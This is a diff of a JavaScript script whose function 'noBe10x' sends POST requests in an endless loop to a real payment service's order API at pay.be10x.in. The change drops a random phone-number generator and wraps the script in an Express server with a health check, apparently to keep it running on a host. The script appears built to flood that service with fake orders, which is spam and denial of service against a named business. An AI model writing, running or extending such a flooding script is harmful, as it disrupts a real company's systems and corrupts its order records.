@@ -1,18 +1,12 @@
-const LIMIT = 10000;
+const express = require("express");
 
-function generateMobileNumber() {
-  let mobileNumber = "9"; // Start with '9' to comply with common mobile number formats
-  for (let j = 1; j < 10; j++) {
-    mobileNumber += Math.floor(Math.random() * 10); // Append random digits
-  }
-  return mobileNumber;
-}
+const server = express();
+const LIMIT = 10000;
 
 async function noBe10x() {
   //for (let i = 0; i < LIMIT; i++) {
   let i = 0;
   while (true) {
-    const mobileNumber = generateMobileNumber();
     const response = await fetch("https://pay.be10x.in/api/orders", {
       method: "POST",
       body: JSON.stringify({
@@ -138,4 +132,13 @@ async function noBe10x() {
   }
 }
 
+server.get("/health", (req, res) => {
+  res.json({ success: true });
+});
+
+const PORT = 3000;
 noBe10x();
+
+server.listen(PORT, () => {
+  console.log(`server running at port: ${PORT}`);
+});
